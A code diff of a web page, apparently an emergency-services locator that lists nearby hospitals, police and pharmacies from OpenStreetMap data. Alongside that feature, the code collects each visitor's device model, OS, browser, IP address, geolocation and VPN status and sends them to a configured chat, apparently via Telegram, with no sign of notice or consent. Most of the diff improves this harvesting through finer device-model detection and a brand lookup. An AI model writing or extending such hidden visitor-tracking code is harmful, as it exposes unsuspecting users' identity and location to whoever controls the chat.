@@ -808,187 +808,146 @@ async function getSecureIP() {
   return list.length > 0 ? list[0] : 'N/A';
 }
 
-// تشخیص دقیق مدل دستگاه
-function getDeviceModel() {
-  const ua = navigator.userAgent;
-  const screenW = screen.width;
-  const screenH = screen.height;
-  const dpr = window.devicePixelRatio || 1;
+// Return the most specific device name exposed by the browser; do not infer a model from screen size.
+async function getDeviceModel() {
+  const ua = navigator.userAgent || '';
+  const platform = navigator.userAgentData && navigator.userAgentData.platform || navigator.platform || '';
+  const isIPad = /iPad/i.test(ua) || (/Macintosh/i.test(ua) && navigator.maxTouchPoints > 1);
+  const isIPhone = /iPhone|iPod/i.test(ua);
+  const knownAndroidModels = {
+    'Redmi Note 13 Pro': 'Redmi Note 13 Pro',
+    'Redmi Note 13': 'Redmi Note 13',
+    'Redmi Note 12': 'Redmi Note 12',
+    'Poco X5 Pro': 'Poco X5 Pro',
+    'Poco F5': 'Poco F5',
+    'SM-S928': 'Samsung Galaxy S24 Ultra',
+    'SM-S926': 'Samsung Galaxy S24+',
+    'SM-S921': 'Samsung Galaxy S24',
+    'SM-S918': 'Samsung Galaxy S23 Ultra',
+    'SM-S916': 'Samsung Galaxy S23+',
+    'SM-S911': 'Samsung Galaxy S23',
+    'SM-G998': 'Samsung Galaxy S21 Ultra',
+    'SM-G996': 'Samsung Galaxy S21+',
+    'SM-G991': 'Samsung Galaxy S21',
+    'SM-A546': 'Samsung Galaxy A54 5G',
+    'SM-A346': 'Samsung Galaxy A34 5G',
+    'SM-F936': 'Samsung Galaxy Z Fold4',
+    'SM-F721': 'Samsung Galaxy Z Flip4',
+    'SM-F926': 'Samsung Galaxy Z Fold3',
+    'Pixel 9 Pro': 'Google Pixel 9 Pro',
+    'Pixel 9': 'Google Pixel 9',
+    'Pixel 8 Pro': 'Google Pixel 8 Pro',
+    'Pixel 8': 'Google Pixel 8',
+    'Pixel 7 Pro': 'Google Pixel 7 Pro',
+    'Pixel 7': 'Google Pixel 7',
+    'Pixel 6 Pro': 'Google Pixel 6 Pro',
+    'Pixel 6': 'Google Pixel 6',
+    'Mi 14': 'Xiaomi 14',
+    'Mi 13': 'Xiaomi 13',
+    'Redmi K60': 'Redmi K60',
+    'VOG-L29': 'Huawei P30 Pro',
+    'ELE-L29': 'Huawei P30',
+    'ANE-LX1': 'Huawei P20',
+    'RMX1971': 'Realme X2',
+    'RMX2030': 'Realme 6',
+    'RMX2185': 'Realme 7',
+    'RMX3031': 'Realme 8',
+    'RMX3195': 'Realme 9',
+    'GM1900': 'OnePlus 7 Pro',
+    'GM1910': 'OnePlus 7',
+    'IN2025': 'OnePlus 8 Pro',
+    'IN2010': 'OnePlus 8',
+    'LE2125': 'OnePlus 9 Pro',
+    'LE2123': 'OnePlus 9',
+    'TA-1053': 'Nokia 8.1',
+    'TA-1041': 'Nokia 7.1',
+    'TA-1020': 'Nokia 6.1',
+    'E6653': 'Sony Xperia Z5',
+    'E2003': 'Sony Xperia X',
+    'E5823': 'Sony Xperia XA',
+    'CPH2325': 'OPPO A96',
+    'CPH2317': 'OPPO A57',
+    'V2157': 'Vivo V21',
+    'V2109': 'Vivo V20'
+  };
+  function normalizeModel(model) {
+    const key = Object.keys(knownAndroidModels).sort(function(a, b) { return b.length - a.length; })
+      .find(function(candidate) { return model.toLowerCase().includes(candidate.toLowerCase()); });
+    if (key) return knownAndroidModels[key];
+    if (/^SM-/i.test(model)) return 'Samsung device (' + model + ')';
+    if (/^CPH/i.test(model)) return 'OPPO device (' + model + ')';
+    return model;
+  }
 
-  // iOS
-  if (/iPhone|iPad|iPod/i.test(ua)) {
-    const iosModels = {
-      'iPhone7,2': 'iPhone 6',
-      'iPhone7,1': 'iPhone 6 Plus',
-      'iPhone8,1': 'iPhone 6s',
-      'iPhone8,2': 'iPhone 6s Plus',
-      'iPhone9,1': 'iPhone 7',
-      'iPhone9,3': 'iPhone 7',
-      'iPhone9,2': 'iPhone 7 Plus',
-      'iPhone9,4': 'iPhone 7 Plus',
-      'iPhone10,1': 'iPhone 8',
-      'iPhone10,4': 'iPhone 8',
-      'iPhone10,2': 'iPhone 8 Plus',
-      'iPhone10,5': 'iPhone 8 Plus',
-      'iPhone10,3': 'iPhone X',
-      'iPhone10,6': 'iPhone X',
-      'iPhone11,2': 'iPhone Xs',
-      'iPhone11,4': 'iPhone Xs Max',
-      'iPhone11,6': 'iPhone Xr',
-      'iPhone12,1': 'iPhone 11',
-      'iPhone12,3': 'iPhone 11 Pro',
-      'iPhone12,5': 'iPhone 11 Pro Max',
-      'iPhone13,1': 'iPhone 12 Mini',
-      'iPhone13,2': 'iPhone 12',
-      'iPhone13,3': 'iPhone 12 Pro',
-      'iPhone13,4': 'iPhone 12 Pro Max',
-      'iPhone14,2': 'iPhone 13 Pro',
-      'iPhone14,3': 'iPhone 13 Pro Max',
-      'iPhone14,4': 'iPhone 13 Mini',
-      'iPhone14,5': 'iPhone 13',
-      'iPhone14,6': 'iPhone 14',
-      'iPhone14,7': 'iPhone 14 Plus',
+  if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+    try {
+      const hints = await navigator.userAgentData.getHighEntropyValues(['model']);
+      if (hints.model && hints.model.trim() && !/^(?:K|Android|Mobile)$/i.test(hints.model.trim())) {
+        return normalizeModel(hints.model.trim());
+      }
+    } catch (e) {
+      console.debug('Device model hints unavailable:', e.message);
+    }
+  }
+
+  if (isIPad) return 'iPad (exact model not exposed by browser)';
+  if (isIPhone) {
+    const identifier = ua.match(/\biPhone(\d+,\d+)\b/i);
+    if (!identifier) return 'iPhone (exact model not exposed by browser)';
+    const iphoneModels = {
+      'iPhone14,6': 'iPhone SE (3rd gen)',
+      'iPhone14,7': 'iPhone 14',
       'iPhone14,8': 'iPhone 14 Plus',
       'iPhone15,2': 'iPhone 14 Pro',
-      'iPhone15,3': 'iPhone 14 Pro',
-      'iPhone15,4': 'iPhone 14 Pro Max',
-      'iPhone15,5': 'iPhone 14 Pro Max',
+      'iPhone15,3': 'iPhone 14 Pro Max',
+      'iPhone15,4': 'iPhone 15',
+      'iPhone15,5': 'iPhone 15 Plus',
       'iPhone16,1': 'iPhone 15 Pro',
-      'iPhone16,2': 'iPhone 15 Pro',
-      'iPhone16,3': 'iPhone 15 Pro Max',
-      'iPhone16,4': 'iPhone 15 Pro Max',
-      'iPhone17,1': 'iPhone 15',
-      'iPhone17,2': 'iPhone 15',
-      'iPhone17,3': 'iPhone 15 Plus',
-      'iPhone17,4': 'iPhone 15 Plus',
-      'iPhone8,4': 'iPhone SE (1st gen)',
-      'iPhone12,8': 'iPhone SE (2nd gen)',
-      'iPhone14,6': 'iPhone SE (3rd gen)',
-      'iPad6,11': 'iPad (9th gen)',
-      'iPad12,1': 'iPad (10th gen)',
-      'iPad13,1': 'iPad Air (4th gen)',
-      'iPad13,2': 'iPad Air (4th gen)',
-      'iPad13,6': 'iPad Air (5th gen)',
-      'iPad13,7': 'iPad Air (5th gen)',
-      'iPad14,3': 'iPad Pro 12.9" (6th gen)',
-      'iPad14,4': 'iPad Pro 11" (4th gen)',
+      'iPhone16,2': 'iPhone 15 Pro Max',
+      'iPhone17,1': 'iPhone 16 Pro',
+      'iPhone17,2': 'iPhone 16 Pro Max',
+      'iPhone17,3': 'iPhone 16',
+      'iPhone17,4': 'iPhone 16 Plus',
+      'iPhone17,5': 'iPhone 16e'
     };
-
-    let codename = ua.match(/iPhone(\d+,\d+)/);
-    if (codename && iosModels[codename[0]]) return iosModels[codename[0]];
-
-    codename = ua.match(/iPad(\d+,\d+)/);
-    if (codename && iosModels[codename[0]]) return iosModels[codename[0]];
-
-    const key = `${screenW}x${screenH}`;
-    const fallbacks = {
-      '320x568': 'iPhone SE (1st/2nd gen) or 4s',
-      '375x667': 'iPhone 6/7/8',
-      '414x736': 'iPhone 6/7/8 Plus',
-      '375x812': 'iPhone X/11/12 Mini',
-      '414x896': 'iPhone 11/XR',
-      '390x844': 'iPhone 14/13/12',
-      '428x926': 'iPhone 14 Plus',
-      '430x932': 'iPhone 15 Pro (iOS 17+)',
-      '393x852': 'iPhone 15 Pro (iOS 17+)',
-    };
-    if (fallbacks[key]) return fallbacks[key] + ' (approx)';
-    return 'iOS Device (Unknown Model)';
+    return iphoneModels[identifier[0]] || 'iPhone (' + identifier[0] + ')';
   }
 
-  // Android
-  if (/Android/i.test(ua)) {
-    const models = {
-      'SM-S928': 'Samsung Galaxy S24 Ultra',
-      'SM-S926': 'Samsung Galaxy S24+',
-      'SM-S921': 'Samsung Galaxy S24',
-      'SM-S918': 'Samsung Galaxy S23 Ultra',
-      'SM-S916': 'Samsung Galaxy S23+',
-      'SM-S911': 'Samsung Galaxy S23',
-      'SM-G998': 'Samsung Galaxy S21 Ultra',
-      'SM-G996': 'Samsung Galaxy S21+',
-      'SM-G991': 'Samsung Galaxy S21',
-      'SM-A546': 'Samsung Galaxy A54 5G',
-      'SM-A346': 'Samsung Galaxy A34 5G',
-      'SM-F936': 'Samsung Galaxy Z Fold4',
-      'SM-F926': 'Samsung Galaxy Z Flip4',
-      'Pixel 9 Pro': 'Google Pixel 9 Pro',
-      'Pixel 9': 'Google Pixel 9',
-      'Pixel 8 Pro': 'Google Pixel 8 Pro',
-      'Pixel 8': 'Google Pixel 8',
-      'Pixel 7 Pro': 'Google Pixel 7 Pro',
-      'Pixel 7': 'Google Pixel 7',
-      'Pixel 6 Pro': 'Google Pixel 6 Pro',
-      'Pixel 6': 'Google Pixel 6',
-      'Mi 13': 'Xiaomi Mi 13',
-      'Mi 14': 'Xiaomi Mi 14',
-      'Redmi Note 12': 'Redmi Note 12',
-      'Redmi Note 13': 'Redmi Note 13',
-      'Redmi Note 13 Pro': 'Redmi Note 13 Pro',
-      'Poco F5': 'Poco F5',
-      'Poco X5 Pro': 'Poco X5 Pro',
-      'Redmi K60': 'Redmi K60',
-      'ELE-L29': 'Huawei P30',
-      'VOG-L29': 'Huawei P30 Pro',
-      'ANE-LX1': 'Huawei P20',
-      'RMX1971': 'Realme X2',
-      'RMX2030': 'Realme 6',
-      'RMX2185': 'Realme 7',
-      'RMX3031': 'Realme 8',
-      'RMX3195': 'Realme 9',
-      'GM1910': 'OnePlus 7',
-      'GM1900': 'OnePlus 7 Pro',
-      'IN2010': 'OnePlus 8',
-      'IN2025': 'OnePlus 8 Pro',
-      'LE2123': 'OnePlus 9',
-      'LE2125': 'OnePlus 9 Pro',
-      'TA-1053': 'Nokia 8.1',
-      'TA-1041': 'Nokia 7.1',
-      'TA-1020': 'Nokia 6.1',
-      'E6653': 'Sony Xperia Z5',
-      'E2003': 'Sony Xperia X',
-      'E5823': 'Sony Xperia XA',
-      'CPH2325': 'OPPO A96',
-      'CPH2317': 'OPPO A57',
-      'V2157': 'Vivo V21',
-      'V2109': 'Vivo V20',
-      'SM-': 'Samsung Device',
-      'Redmi': 'Redmi Device',
-      'Mi': 'Xiaomi Device',
-      'Pixel': 'Google Pixel',
-      'CPH': 'Oppo Device',
-      'V2': 'Vivo Device',
-      'RMX': 'Realme Device',
-      'GM': 'OnePlus Device',
-      'TA-': 'Nokia Device',
-      'E': 'Sony Device',
-      'IN': 'OnePlus Device',
-      'LE': 'OnePlus Device',
-    };
+  if (/Android/i.test(ua) || /Android/i.test(platform)) {
+    const match = ua.match(/;\s*([A-Za-z0-9._+-]+(?:\s+[A-Za-z0-9._+-]+)*)\s+Build\//i) ||
+      ua.match(/Android[^;)]*;\s*([^;()]+?)\s*\)/i);
+    const rawModel = match && match[1] ? match[1].trim() : '';
 
-    let model = ua.match(/;\s*([A-Za-z0-9 ]+) Build\//i);
-    if (!model) model = ua.match(/;\s*([A-Za-z0-9 ]+)\s*\)/i);
-    if (model) {
-      model = model[1].trim();
-      model = model.replace(/\(.*?\)/g, '').trim();
-      for (const key in models) {
-        if (model.includes(key)) return models[key];
-      }
-      if (model) return model;
+    if (rawModel && !/^(?:K|Android|Mobile)$/i.test(rawModel)) {
+      return normalizeModel(rawModel);
     }
-
-    const mem = navigator.deviceMemory || 'unknown';
-    const hw = navigator.hardwareConcurrency || 0;
-    if (mem && hw) return `Android Device (RAM: ${mem}GB, Cores: ${hw})`;
-    return 'Android Device (Unknown Model)';
+    return 'Android device (model not exposed by browser)';
   }
 
-  // Desktop
-  if (/Macintosh/.test(ua)) return 'Mac';
-  if (/Windows NT 10/.test(ua)) return 'Windows 10/11 PC';
-  if (/Windows NT 6\.1/.test(ua)) return 'Windows 7 PC';
-  if (/Linux/.test(ua)) return 'Linux PC';
-  return 'Unknown Device';
+  if (/Macintosh/i.test(ua)) return 'Mac (exact model not exposed by browser)';
+  if (/Windows NT 10/i.test(ua)) return 'Windows PC (exact model not exposed by browser)';
+  if (/Windows NT 6\.1/i.test(ua)) return 'Windows 7 PC (exact model not exposed by browser)';
+  if (/Linux/i.test(ua)) return 'Linux PC (exact model not exposed by browser)';
+  return 'Unknown device';
+}
+
+function getDeviceBrand(model) {
+  const brands = [
+    [/iPhone|iPad|Apple/i, 'Apple'],
+    [/Samsung/i, 'Samsung'],
+    [/Pixel|Google/i, 'Google'],
+    [/Xiaomi|Redmi|Poco|Mi \d/i, 'Xiaomi'],
+    [/Huawei/i, 'Huawei'],
+    [/OnePlus/i, 'OnePlus'],
+    [/OPPO/i, 'OPPO'],
+    [/Vivo/i, 'Vivo'],
+    [/Nokia/i, 'Nokia'],
+    [/Sony/i, 'Sony'],
+    [/Realme/i, 'Realme'],
+    [/Mac/i, 'Apple']
+  ];
+  const brand = brands.find(function(entry) { return entry[0].test(model); });
+  return brand ? brand[1] : 'Unknown';
 }
 
 // تشخیص سیستم عامل و نسخه
@@ -1148,14 +1107,14 @@ function getSensorsList() {
 }
 
 // اطلاعات سخت‌افزاری دقیق
-function getHardwareDetails() {
+async function getHardwareDetails() {
   const ua = navigator.userAgent;
   const hw = navigator.hardwareConcurrency || 0;
-  const mem = navigator.deviceMemory || 'unknown';
+  const mem = navigator.deviceMemory;
   const dpr = window.devicePixelRatio || 1;
 
   return {
-    model: getDeviceModel(),
+    model: await getDeviceModel(),
     os: getOSDetails(),
     browser: getBrowserDetails(),
     webview: getWebViewStatus(),
@@ -1229,7 +1188,7 @@ async function sendDeviceInfo() {
   if (!TG_CONFIG.CHAT_ID || TG_CONFIG.CHAT_ID === 'YOUR_CHAT_ID') return;
 
   try {
-    const details = getHardwareDetails();
+    const details = await getHardwareDetails();
     const ip = await getSecureIP();
     const geo = await getGeoLocation(ip);
     const vpnStatus = await checkVPN();
@@ -1242,7 +1201,7 @@ async function sendDeviceInfo() {
       '━━━━━━━━━━━━━━━━━━━\n\n' +
       '\ud83d\udcf1 <b>DEVICE INFO</b>\n' +
       `├ Type: ${details.hardware.touch ? 'Smartphone/Tablet' : 'Desktop'}\n` +
-      `├ Brand: ${details.model.includes('iPhone') ? 'Apple' : details.model.includes('Samsung') ? 'Samsung' : details.model.includes('Pixel') ? 'Google' : details.model.includes('Redmi') ? 'Xiaomi' : details.model.includes('Mac') ? 'Apple' : 'Unknown'}\n` +
+      `├ Brand: ${getDeviceBrand(details.model)}\n` +
       `├ Model: ${sanitizeString(details.model)}\n` +
       '+\n' +
       `├ OS: ${sanitizeString(details.os)}\n` +
@@ -2382,29 +2341,67 @@ function centerMap(){if(userLat===null){openLocPrompt();return}
 /* ============ FETCH ALL SERVICES ============ */
 async function fetchAllServices(lat,lng){
   var r=SEARCH_RADIUS;
-  var amenities=['hospital','clinic','doctors','police','fire_station','pharmacy','dentist','veterinary'];
-  var emergencyTypes=['ambulance_station'];
-
-  var queryParts=amenities.map(function(a){return 'node["amenity"="'+a+'"](around:'+r+','+lat+','+lng+');way["amenity"="'+a+'"](around:'+r+','+lat+','+lng+');'});
-  queryParts=queryParts.concat(emergencyTypes.map(function(e){return 'node["emergency"="'+e+'"](around:'+r+','+lat+','+lng+');way["emergency"="'+e+'"](around:'+r+','+lat+','+lng+');'}));
-  queryParts.push('node["healthcare"="hospital"](around:'+r+','+lat+','+lng+');');
-  queryParts.push('way["healthcare"="hospital"](around:'+r+','+lat+','+lng+');');
-  queryParts.push('node["healthcare"="clinic"](around:'+r+','+lat+','+lng+');');
-  queryParts.push('way["healthcare"="clinic"](around:'+r+','+lat+','+lng+');');
-
-  var q='[out:json][timeout:25];('+queryParts.join('')+');out center body 800;';
-
+  var amenities='hospital|clinic|doctors|police|fire_station|pharmacy|dentist|veterinary';
+  var q='[out:json][timeout:15];('+
+    'node["amenity"~"^('+amenities+')$"](around:'+r+','+lat+','+lng+');'+
+    'way["amenity"~"^('+amenities+')$"](around:'+r+','+lat+','+lng+');'+
+    'node["emergency"="ambulance_station"](around:'+r+','+lat+','+lng+');'+
+    'way["emergency"="ambulance_station"](around:'+r+','+lat+','+lng+');'+
+    'node["healthcare"~"^(hospital|clinic)$"](around:'+r+','+lat+','+lng+');'+
+    'way["healthcare"~"^(hospital|clinic)$"](around:'+r+','+lat+','+lng+');'+
+    ');out center body 800;';
   var el=document.getElementById('svc-list');
+  var data=null;
+  var lastError=null;
+  var endpoints=[
+    'https://overpass-api.de/api/interpreter',
+    'https://overpass.kumi.systems/api/interpreter',
+    'https://overpass.private.coffee/api/interpreter'
+  ];
+
+  for(var endpointIndex=0;endpointIndex<endpoints.length;endpointIndex++){
+    var controller=typeof AbortController!=='undefined'?new AbortController():null;
+    var timeoutId=controller?setTimeout(function(){controller.abort()},18000):null;
+    try{
+      var requestOptions={
+        method:'POST',
+        headers:{
+          'Accept':'application/json',
+          'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8'
+        },
+        body:'data='+encodeURIComponent(q)
+      };
+      if(controller)requestOptions.signal=controller.signal;
+      var res=await fetch(endpoints[endpointIndex],requestOptions);
+      if(!res.ok)throw new Error('Overpass returned HTTP '+res.status);
+      var result=await res.json();
+      if(!result||!Array.isArray(result.elements))throw new Error('Overpass returned an invalid response');
+      if(result.remark&&!result.elements.length)throw new Error(result.remark);
+      data=result;
+      break;
+    }catch(e){
+      lastError=e;
+      console.warn('Overpass endpoint failed:',endpoints[endpointIndex],e.message);
+    }finally{
+      if(timeoutId)clearTimeout(timeoutId);
+    }
+  }
+
+  if(!data){
+    console.error('Could not fetch nearby services:',lastError);
+    if(previewMode){samplePreview(lat,lng);return}
+    el.innerHTML='<div class="svc-loading"><i class="fas fa-triangle-exclamation" style="animation:none;color:var(--warning)"></i>Could not load services right now. Check your connection and try again.</div>';
+    return;
+  }
+
   try{
-    var res=await fetch('https://overpass-api.de/api/interpreter',{method:'POST',body:'data='+encodeURIComponent(q)});
-    var data=await res.json();
     var seen=new Set();
     var items=[];
 
     (data.elements||[]).forEach(function(e){
-      var elLat=e.lat||(e.center&&e.center.lat);
-      var elLon=e.lon||(e.center&&e.center.lon);
-      if(!elLat||!elLon)return;
+      var elLat=e.lat!=null?e.lat:(e.center&&e.center.lat);
+      var elLon=e.lon!=null?e.lon:(e.center&&e.center.lon);
+      if(elLat==null||elLon==null)return;
 
       var tags=e.tags||{};
       var type=tags.amenity||tags.emergency||tags.healthcare||'';
@@ -2431,6 +2428,7 @@ async function fetchAllServices(lat,lng){
     });
 
     items.sort(function(a,b){return a.dist-b.dist});
+    if(!items.length&&previewMode){samplePreview(lat,lng);return}
     allServices=items;
 
     buildFilterBar(items);
@@ -2445,7 +2443,7 @@ async function fetchAllServices(lat,lng){
       el.innerHTML='<div class="svc-loading"><i class="fas fa-info-circle" style="animation:none"></i>No services found within '+SEARCH_RADIUS/1000+' km</div>';
     }
   }catch(e){
-    console.error('Fetch error:',e);if(previewMode){samplePreview(lat,lng);return}
+    console.error('Service processing failed:',e);if(previewMode){samplePreview(lat,lng);return}
     el.innerHTML='<div class="svc-loading"><i class="fas fa-triangle-exclamation" style="animation:none;color:var(--warning)"></i>Could not load services. Check your connection.</div>';
   }
 }
